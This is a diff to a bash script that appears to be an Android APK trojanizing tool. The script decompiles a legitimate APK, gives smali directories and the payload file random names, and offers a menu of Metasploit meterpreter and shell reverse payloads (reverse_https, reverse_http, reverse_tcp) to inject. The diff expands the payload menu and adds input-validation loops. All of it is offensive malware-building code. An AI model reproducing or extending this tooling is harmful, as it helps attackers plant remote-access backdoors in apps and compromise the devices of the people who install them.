@@ -41,7 +41,8 @@ lanip=`hostname -I`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
 ver="v0.1"
 APKTOOL="$path/input/apktool.jar"
-ICON_DIR="$path/input/"
+ICON_DIR="$path/input"
+ORIGINAL_DIR="$path/input"
 VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
@@ -183,22 +184,44 @@ function get_payload()
         echo ""
         echo -e $white "1) android/meterpreter/reverse_https"
         echo ""
-        echo -e $white "2) android/meterpreter/reverse_tcp"
+        echo -e $white "2) android/meterpreter/reverse_http"
         echo ""
+        echo -e $white "3) android/meterpreter/reverse_tcp"
+        echo ""
+        echo -e $white "4) android/shell/reverse_https"
+        echo ""
+        echo -e $white "5) android/shell/reverse_tcp"
+        echo ""
+while true; do
         read -p $'\e[1;33m[*] Enter Payload Number:\e[0m \e[1;37m' choice && echo -e '\e[0m'
 case $choice in
     1)
         PAYLOAD="android/meterpreter/reverse_https"
+        break
         ;;
     2)
+        PAYLOAD="android/meterpreter/reverse_http"
+        break
+        ;;
+    3)
         PAYLOAD="android/meterpreter/reverse_tcp"
+        break
+        ;;
+    4)
+        PAYLOAD="android/shell/reverse_https"
+        break
+        ;;
+    5)
+        PAYLOAD="android/shell/reverse_tcp"
+        break
         ;;
     *)
-        echo -e $red "[*] Invalid Choice"
-        exit 1
+        echo -e $red "[X] Invalid Choice. Please Try Again"
+        echo ""
         ;;
+        
 esac
-
+done
 }
 #function name
 function payload_name()
@@ -211,13 +234,23 @@ function payload_name()
 function orig_apk()
 {
         echo -e "\e[1;32m☢ ORIGINAL APK ☢\e[0m"
+        echo ""
+        while true; do
         read -p $'\e[1;33m[*] Enter Original APK:\e[0m \e[1;37m' orig && echo -e '\e[0m'
-
+        original_path="$ORIGINAL_DIR/$orig"
+  if [ ! -f "$original_path" ]; then
+    echo -e $red "[X] APK $orig Not Found. Please Try Again."
+    echo ""
+    else
+            break
+  fi
+    done
 }
 #function change icon
 function change_icon()
 {
         echo -e "\e[1;32m☢ CHOOSE PNG ICON ☢\e[0m"
+        echo ""
         read -p $'\e[1;33m[*] Enter Icon Filename:\e[0m \e[1;37m' iconos && echo -e '\e[0m'
         icon_path="$ICON_DIR/$iconos"
   if [ ! -f "$icon_path" ]; then
@@ -270,7 +303,7 @@ function apk_decomp1()
  echo -e $yellow ""
  echo "[*] Decompiling Original APK..."
  spinlong
- java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
+ java -jar $APKTOOL d -f -o $path/original $original_path > /dev/null 2>&1
 }
 function apk_comp1()
 {
@@ -618,7 +651,6 @@ function main()
                 get_payload
                 echo
                 orig_apk
-                echo
 		spinlong
 		gen_payload
 		spinlong
